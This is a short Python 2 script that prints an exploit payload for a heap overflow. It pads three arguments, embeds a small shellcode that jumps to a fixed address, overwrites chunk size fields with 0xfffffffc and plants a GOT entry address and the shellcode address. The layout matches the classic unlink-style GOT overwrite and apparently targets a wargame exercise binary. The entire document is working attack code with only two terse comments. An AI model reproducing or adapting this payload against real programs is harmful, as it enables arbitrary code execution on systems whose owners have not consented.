import struct

SHELLCODE = "\xb8\x64\x88\x04\x08\xff\xd0"
SHELLCODE_ADDR = struct.pack("<L", 0x804c00c)
GOT_8 = struct.pack("<L", 0x0804b128-0x0c)

A = "A"*4
A += SHELLCODE

B = "B"*36					#MODIFY LENGHT HERE
B += "\x65"

C = "C"*92					#OVERFLOW HERE
C += "\xfc\xff\xff\xff"
C += "\xfc\xff\xff\xff"
C += GOT_8
C += SHELLCODE_ADDR

print A + " " + B + " " + C
